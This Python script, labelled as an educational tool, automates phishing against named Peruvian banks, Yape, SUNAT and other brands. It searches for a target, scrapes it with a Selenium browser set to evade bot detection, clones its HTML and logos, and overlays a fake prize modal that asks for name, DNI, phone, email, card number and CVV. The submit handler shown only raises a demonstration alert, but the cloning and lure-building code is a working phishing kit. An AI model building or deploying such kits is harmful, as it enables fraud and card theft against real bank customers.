# advanced_web_cloner.py
"""
Advanced Web Cloning Agent - Educational Cybersecurity Tool
⚠️ FOR EDUCATIONAL PURPOSES ONLY - CYBERSECURITY AWARENESS
"""

import os
import json
import time
import requests
import re
import base64
from typing import TypedDict, List, Dict, Optional
from urllib.parse import urljoin, urlparse
from dotenv import load_dotenv

from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup
from langchain.chat_models import ChatOpenAI
from langchain.schema import SystemMessage, HumanMessage
from langgraph.graph import StateGraph, END

# Load environment variables
load_dotenv()
SERPER_KEY = os.getenv("SERPER_API_KEY")
OPENAI_KEY = os.getenv("OPENAI_API_KEY")

##############################################################################
# 1. STATE DEFINITIONS
##############################################################################

class GraphState(TypedDict):
    search_query: str
    url: str
    site_analysis: dict
    cloned_html: str
    phishing_form: str
    ### CAMBIO: Mensajes de confirmación separados para evitar que se sobrescriban
    clone_confirmation: str
    phishing_confirmation: str

##############################################################################
# 2. UTILITY FUNCTIONS
##############################################################################

def setup_driver(headless: bool = True, stealth: bool = True) -> webdriver.Chrome:
    """Setup Chrome driver with optimal settings"""
    options = Options()
    
    if headless:
        options.add_argument("--headless")
    
    if stealth:
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    
    service = ChromeService(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    
    if stealth:
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    
    return driver

def detect_site_type(driver) -> str:
    """Detect website type for optimized scraping"""
    try:
        frameworks = driver.execute_script("""
            return {
                react: !!(window.React || document.querySelector('[data-reactroot]')),
                angular: !!(window.angular || window.ng),
                vue: !!(window.Vue),
                jquery: !!(window.jQuery || window.$)
            }
        """)
        page_source = driver.page_source.lower()
        has_cloudflare = "cloudflare" in page_source
        has_recaptcha = "recaptcha" in page_source
        script_count = len(driver.find_elements("tag name", "script"))
        
        if frameworks.get('react') or frameworks.get('angular') or frameworks.get('vue'):
            return "spa"
        elif has_cloudflare or has_recaptcha:
            return "protected"
        elif script_count > 20:
            return "heavy"
        else:
            return "normal"
    except Exception:
        return "normal"

def smart_page_analysis(driver, url: str, max_wait: int = 15) -> str:
    """Intelligent page analysis that adapts to site type"""
    try:
        driver.get(url)
        time.sleep(3)
        site_type = detect_site_type(driver)
        
        if site_type == "spa":
            print("... [DEBUG] SPA detected, waiting for complete load...")
            time.sleep(8)
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(2)
            driver.execute_script("window.scrollTo(0, 0);")
        elif site_type == "heavy":
            print("... [DEBUG] Heavy site detected, optimizing load...")
            time.sleep(6)
            for i in range(3):
                driver.execute_script(f"window.scrollTo(0, {i * 300});")
                time.sleep(1)
        elif site_type == "protected":
            print("... [DEBUG] Protected site detected, using stealth mode...")
            time.sleep(10)
            driver.execute_script("document.body.click();")
            time.sleep(2)
        else:
            print("... [DEBUG] Normal site detected, standard wait.")
            time.sleep(4)
            
        driver.implicitly_wait(max_wait)
        return driver.page_source
    except Exception as e:
        print(f"⚠️ Analysis error: {e}")
        return driver.page_source

def download_and_encode_image(img_url: str, base_url: str) -> str:
    try:
        if not img_url.startswith('http'):
            img_url = urljoin(base_url, img_url)
        response = requests.get(img_url, timeout=10)
        response.raise_for_status()
        content_type = response.headers.get('content-type', 'image/png')
        encoded = base64.b64encode(response.content).decode('utf-8')
        return f"data:{content_type};base64,{encoded}"
    except Exception:
        return img_url

##############################################################################
# 3. CSS AND BRAND ANALYSIS
##############################################################################

def extract_css_styles(soup: BeautifulSoup) -> Dict:
    styles = {"colors": [], "fonts": [], "css_rules": []}
    for elem in soup.find_all(style=True):
        style_content = elem.get('style', '')
        color_matches = re.findall(r'color:\s*([^;]+)', style_content)
        bg_matches = re.findall(r'background-color:\s*([^;]+)', style_content)
        styles["colors"].extend(color_matches + bg_matches)
        font_matches = re.findall(r'font-family:\s*([^;]+)', style_content)
        styles["fonts"].extend(font_matches)
    for style_tag in soup.find_all('style'):
        css_content = style_tag.string or ""
        styles["css_rules"].append(css_content)
        color_matches = re.findall(r'color:\s*([^;}]+)', css_content)
        bg_matches = re.findall(r'background-color:\s*([^;}]+)', css_content)
        styles["colors"].extend(color_matches + bg_matches)
        font_matches = re.findall(r'font-family:\s*([^;}]+)', css_content)
        styles["fonts"].extend(font_matches)
    styles["colors"] = list(set([c.strip() for c in styles["colors"] if c.strip()]))
    styles["fonts"] = list(set([f.strip() for f in styles["fonts"] if f.strip()]))
    return styles

def analyze_brand_elements(soup: BeautifulSoup) -> Dict:
    brand_info = {"logo_urls": [], "brand_name": "", "main_colors": [], "button_styles": []}
    for img in soup.find_all('img'):
        src = img.get('src', '')
        alt = img.get('alt', '').lower()
        if any(keyword in alt for keyword in ['logo', 'brand', 'header']):
            brand_info["logo_urls"].append(src)
    title_tag = soup.find('title')
    if title_tag:
        brand_info["brand_name"] = title_tag.string or ""
    for btn in soup.find_all(['button', 'input[type="submit"]', 'a']):
        if btn.get('class'):
            classes = ' '.join(btn.get('class', []))
            if any(keyword in classes.lower() for keyword in ['btn', 'button', 'submit']):
                style = btn.get('style', '')
                brand_info["button_styles"].append({"classes": classes, "style": style})
    return brand_info

def absolutize_and_inline_resources(html: str, base_url: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    for link in soup.find_all("link", href=True):
        href = link.get("href")
        if href and not bool(urlparse(href).netloc):
            link["href"] = urljoin(base_url, href)
    for script in soup.find_all("script", src=True):
        src = script.get("src")
        if src and not bool(urlparse(src).netloc):
            script["src"] = urljoin(base_url, src)
    for img in soup.find_all("img", src=True):
        src = img.get("src")
        if src and not bool(urlparse(src).netloc):
            abs_url = urljoin(base_url, src)
            alt = img.get('alt', '').lower()
            if any(keyword in alt for keyword in ['logo', 'brand']) or 'logo' in src.lower():
                img["src"] = download_and_encode_image(abs_url, base_url)
            else:
                img["src"] = abs_url
    for elem in soup.find_all(attrs={"src": True}):
        if elem.name not in ["img", "script"]:
            src = elem.get("src")
            if src and not bool(urlparse(src).netloc):
                elem["src"] = urljoin(base_url, src)
    return str(soup)

##############################################################################
# 4. SEARCH AGENT
##############################################################################

def search_node(state: GraphState) -> Dict:
    print("\n--- 1. Ejecutando SearchAgent ---")
    query = state["search_query"]
    print(f"... [DEBUG] Buscando URL para: '{query}'")
    try:
        url = serper_first_url(query)
        print(f"... [DEBUG] URL encontrada: {url}")
        return {"url": url}
    except Exception as e:
        print(f"❌ Search node error: {e}")
        return {"url": ""}

def serper_first_url(query: str) -> str:
    try:
        resp = requests.post(
            "https://google.serper.dev/search",
            headers={"X-API-KEY": SERPER_KEY, "Content-Type": "application/json"},
            data=json.dumps({"q": query, "num": 5})
        )
        resp.raise_for_status()
        organic = resp.json().get("organic", [])
        for result in organic:
            url = result.get("link", "")
            if url and not any(sub in url for sub in ["blog", "help", "support", "news", "careers"]):
                return url
        return organic[0]["link"] if organic else ""
    except Exception as e:
        print(f"❌ Search error: {e}")
        return ""

##############################################################################
# 5. ANALYSIS AGENT
##############################################################################

def analysis_node(state: GraphState) -> Dict:
    print("\n--- 2. Ejecutando AnalysisAgent ---")
    url = state["url"]
    if not url:
        return {"site_analysis": {}, "cloned_html": ""}
    
    driver = setup_driver(headless=True, stealth=True)
    try:
        print(f"... [DEBUG] Analizando y obteniendo HTML de: {url}")
        raw_html = smart_page_analysis(driver, url)
        print("... [DEBUG] HTML obtenido, iniciando análisis de elementos.")
    finally:
        driver.quit()
    
    soup = BeautifulSoup(raw_html, "html.parser")
    css_styles = extract_css_styles(soup)
    brand_elements = analyze_brand_elements(soup)
    analysis = {
        "url": url,
        "title": soup.find('title').string if soup.find('title') else "",
        "css_styles": css_styles,
        "brand_elements": brand_elements,
        "has_forms": len(soup.find_all('form')) > 0,
        "form_count": len(soup.find_all('form')),
        "meta_description": "",
    }
    meta_desc = soup.find('meta', attrs={'name': 'description'})
    if meta_desc:
        analysis["meta_description"] = meta_desc.get('content', '')
    
    print("... [DEBUG] Análisis completado.")
    return {"site_analysis": analysis, "cloned_html": raw_html}

##############################################################################
# 6. CLONE AGENT
##############################################################################

def clone_node(state: GraphState) -> Dict:
    print("\n--- 3. Ejecutando CloneAgent ---")
    url = state["url"]
    raw_html = state["cloned_html"]
    
    if not url or not raw_html:
        return {"clone_confirmation": "❌ No URL or HTML content available"}
    
    print("... [DEBUG] Procesando HTML para crear el clon...")
    enhanced_html = absolutize_and_inline_resources(raw_html, url)
    host = urlparse(url).netloc.replace('.', '_').replace(':', '_')
    filename = f"{host}_enhanced_clone.html"
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(enhanced_html)
        
        message = f"✅ Enhanced clone saved as {filename}"
        print(f"... [DEBUG] {message}")
        ### CAMBIO: Devolver el mensaje en su propio campo
        return {"clone_confirmation": message, "cloned_html": enhanced_html}
    except Exception as e:
        return {"clone_confirmation": f"❌ Error saving clone: {e}"}

##############################################################################
# 7. PHISHING FORM GENERATOR
##############################################################################

def phishing_node(state: GraphState) -> Dict:
    print("\n--- 4. Ejecutando PhishingAgent ---")
    analysis = state["site_analysis"]
    cloned_html = state["cloned_html"]
    
    if not analysis or not cloned_html:
        return {"phishing_confirmation": "❌ No analysis or HTML available"}
    
    print("... [DEBUG] Generando el HTML del demo de phishing...")
    phishing_html = generate_phishing_form(analysis, cloned_html)
    
    url = analysis.get("url", "unknown")
    host = urlparse(url).netloc.replace('.', '_').replace(':', '_')
    filename = f"{host}_phishing_demo.html"
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(phishing_html)
        
        message = f"🎯 Phishing demo generated: {filename}"
        print(f"... [DEBUG] {message}")
        ### CAMBIO: Devolver el mensaje en su propio campo
        return {"phishing_form": phishing_html, "phishing_confirmation": message}
    except Exception as e:
        return {"phishing_form": "", "phishing_confirmation": f"❌ Error generating phishing demo: {e}"}

def generate_phishing_form(analysis: Dict, cloned_html: str) -> str:
    brand_name = analysis.get("brand_elements", {}).get("brand_name", "Banco")
    colors = analysis.get("css_styles", {}).get("colors", ["#003366", "#ff6600"])
    primary_color = colors[0] if colors else "#003366"
    soup = BeautifulSoup(cloned_html, "html.parser")
    existing_styles = [tag.string for tag in soup.find_all('style') if tag.string]
    
    return f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Felicidades! - {brand_name}</title>
    <style>
        /* Original site styles */
        {''.join(existing_styles)}
        
        /* Phishing modal styles */
        .phishing-overlay {{ position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 9999; display: flex; justify-content: center; align-items: center; }}
        .phishing-modal {{ background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); max-width: 500px; width: 90%; text-align: center; animation: slideIn 0.5s ease-out; position: relative; }}
        @keyframes slideIn {{ from {{ transform: translateY(-50px); opacity: 0; }} to {{ transform: translateY(0); opacity: 1; }} }}
        .phishing-title {{ color: {primary_color}; font-size: 24px; font-weight: bold; margin-bottom: 20px; }}
        .phishing-subtitle {{ color: #666; margin-bottom: 30px; line-height: 1.5; }}
        .phishing-form {{ text-align: left; }}
        .form-group {{ margin-bottom: 20px; }}
        .form-group label {{ display: block; margin-bottom: 5px; font-weight: bold; color: #333; }}
        .form-group input {{ width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; }}
        .form-group input:focus {{ border-color: {primary_color}; outline: none; }}
        .submit-btn {{ background: {primary_color}; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: background 0.3s; }}
        .submit-btn:hover {{ background: #002244; }}
        .security-badge {{ display: flex; align-items: center; justify-content: center; margin-top: 20px; color: #666; font-size: 12px; }}
        .close-btn {{ position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: #999; }}
    </style>
</head>
<body>
    {cloned_html}
    <div class="phishing-overlay" id="phishingModal">
        <div class="phishing-modal">
            <button class="close-btn" onclick="closeModal()">&times;</button>
            <div class="phishing-title">🎉 ¡FELICIDADES! 🎉</div>
            <div class="phishing-subtitle">Has sido seleccionado para participar en nuestro programa de recompensas exclusivo.<br><br><strong>Premio: S/ 5,000 en tu cuenta</strong><br><br>Para procesar tu premio, necesitamos verificar tu identidad por seguridad.</div>
            <form class="phishing-form" onsubmit="handleSubmit(event)">
                <div class="form-group"><label for="fullName">Nombre Completo:</label><input type="text" id="fullName" name="fullName" required></div>
                <div class="form-group"><label for="dni">DNI:</label><input type="text" id="dni" name="dni" pattern="[0-9]{{8}}" required></div>
                <div class="form-group"><label for="phone">Teléfono:</label><input type="tel" id="phone" name="phone" required></div>
                <div class="form-group"><label for="email">Email:</label><input type="email" id="email" name="email" required></div>
                <div class="form-group"><label for="cardNumber">Número de Tarjeta (para depósito):</label><input type="text" id="cardNumber" name="cardNumber" pattern="[0-9]{{16}}" maxlength="16" required></div>
                <div class="form-group"><label for="cvv">CVV:</label><input type="text" id="cvv" name="cvv" pattern="[0-9]{{3,4}}" maxlength="4" required></div>
                <button type="submit" class="submit-btn">🔒 RECLAMAR PREMIO AHORA</button>
                <div class="security-badge">🔐 Conexión segura SSL • Datos protegidos</div>
            </form>
        </div>
    </div>
    <script>
        setTimeout(() => {{ document.getElementById('phishingModal').style.display = 'flex'; }}, 3000);
        function closeModal() {{ document.getElementById('phishingModal').style.display = 'none'; }}
        function handleSubmit(event) {{
            event.preventDefault();
            const submitBtn = document.querySelector('.submit-btn');
            submitBtn.innerHTML = '⏳ Procesando...';
            submitBtn.disabled = true;
            setTimeout(() => {{
                alert('⚠️ PHISHING DEMONSTRATION ⚠️\\n\\nThis is an educational simulation.\\nNever provide real data on unverified sites.');
                submitBtn.innerHTML = '✅ DEMONSTRATION COMPLETED';
            }}, 2000);
        }}
        window.addEventListener('beforeunload', function(e) {{ e.preventDefault(); e.returnValue = ''; }});
    </script>
</body>
</html>"""

##############################################################################
# 8. WORKFLOW CONSTRUCTION
##############################################################################

def create_workflow():
    workflow = StateGraph(GraphState)
    workflow.add_node("SearchAgent", search_node)
    workflow.add_node("AnalysisAgent", analysis_node)
    workflow.add_node("CloneAgent", clone_node)
    workflow.add_node("PhishingAgent", phishing_node)
    workflow.set_entry_point("SearchAgent")
    workflow.add_edge("SearchAgent", "AnalysisAgent")
    workflow.add_edge("AnalysisAgent", "CloneAgent")
    workflow.add_edge("CloneAgent", "PhishingAgent")
    workflow.add_edge("PhishingAgent", END)
    return workflow.compile()

##############################################################################
# 9. MAIN EXECUTION
##############################################################################

PRESET_SITES = {
    "1": {"name": "Interbank", "query": "interbank.pe"},
    "2": {"name": "BBVA", "query": "bbva.pe"},
    "3": {"name": "BCP", "query": "viabcp.com"},
    "4": {"name": "Yape", "query": "yape.com.pe"},
    "5": {"name": "Saga Falabella", "query": "sagafalabella.com.pe"},
    "6": {"name": "Movistar", "query": "movistar.com.pe"},
    "7": {"name": "SUNAT", "query": "sunat.gob.pe"},
    "8": {"name": "Scotiabank", "query": "scotiabank.com.pe"},
}

def main():
    print("🚀 Advanced Web Cloning Agent - Multi-Site Version")
    print("⚠️  FOR EDUCATIONAL PURPOSES ONLY - CYBERSECURITY AWARENESS")
    print("=" * 70)
    
    if not SERPER_KEY or not OPENAI_KEY:
        print("❌ Missing API keys. Please configure SERPER_API_KEY and OPENAI_API_KEY in .env file")
        return
    
    print("\n📋 PRECONFIGURED SITES:")
    for key, site in PRESET_SITES.items():
        print(f"  {key}. {site['name']} ({site['query']})")
    print("  9. Custom site")
    
    choice = input("\n🎯 Select an option (1-9): ").strip()
    
    if choice in PRESET_SITES:
        target_query = PRESET_SITES[choice]["query"]
        site_name = PRESET_SITES[choice]["name"]
        print(f"\n✅ Selected: {site_name}")
    elif choice == "9":
        target_query = input("🌐 Enter custom site: ").strip()
        site_name = target_query
    else:
        print("❌ Invalid option, using Interbank as default")
        target_query = "interbank.pe"
        site_name = "Interbank"
    
    if not target_query:
        print("❌ No valid site entered")
        return
    
    print(f"\n🔍 Processing: {site_name} ({target_query})")
    print("-" * 50)
    
    try:
        app = create_workflow()
        start_time = time.time()
        final_state = app.invoke({"search_query": target_query})
        end_time = time.time()
        
        ### CAMBIO: Lógica de reporte de resultados corregida
        print(f"\n\n📊 ==================== FINAL RESULTS ==================== ({end_time - start_time:.1f}s)")
        print(f"🌐 URL found: {final_state.get('url', 'N/A')}")
        print(f"📄 Analysis completed: {'✅' if final_state.get('site_analysis') else '❌'}")
        
        # Revisar los mensajes de confirmación específicos
        clone_msg = final_state.get('clone_confirmation', '')
        phishing_msg = final_state.get('phishing_confirmation', '')

        print(f"📋 Clone generated: {'✅' if '✅' in clone_msg else '❌'}")
        print(f"🎯 Phishing demo: {'✅' if '🎯' in phishing_msg else '❌'}")
        
        if final_state.get('site_analysis'):
            analysis = final_state['site_analysis']
            print(f"\n🎨 DESIGN ANALYSIS:")
            print(f"  📝 Title: {analysis.get('title', 'N/A')[:50]}...")
            colors = analysis.get('css_styles', {}).get('colors', [])
            if colors: print(f"  🎨 Colors: {', '.join(colors[:3])}")
            fonts = analysis.get('css_styles', {}).get('fonts', [])
            if fonts: print(f"  🔤 Fonts: {', '.join(fonts[:2])}")
            print(f"  📝 Forms: {analysis.get('form_count', 0)}")
            brand_name = analysis.get('brand_elements', {}).get('brand_name', '')
            if brand_name: print(f"  🏷️  Brand: {brand_name[:30]}")
        
        print("\n" + "="*25 + " LOGS " + "="*25)
        print(clone_msg)
        print(phishing_msg)
        
        print(f"\n📁 GENERATED FILES:")
        url = final_state.get('url', '')
        if url:
            host = urlparse(url).netloc.replace('.', '_').replace(':', '_')
            print(f"  📄 {host}_enhanced_clone.html")
            print(f"  🎯 {host}_phishing_demo.html")
        
        print(f"\n⚠️  REMINDER: Use these files only for cybersecurity education")
        
    except KeyboardInterrupt:
        print(f"\n⏹️  Process interrupted by user")
    except Exception as e:
        print(f"\n❌ ERROR: {str(e)}")
        print("🔧 Possible solutions:")
        print("  • Verify your API keys in the .env file")
        print("  • Check your internet connection")
        print("  • The site might have anti-bot protections")
        print("  • Try another site from the list")

if __name__ == "__main__":
    main()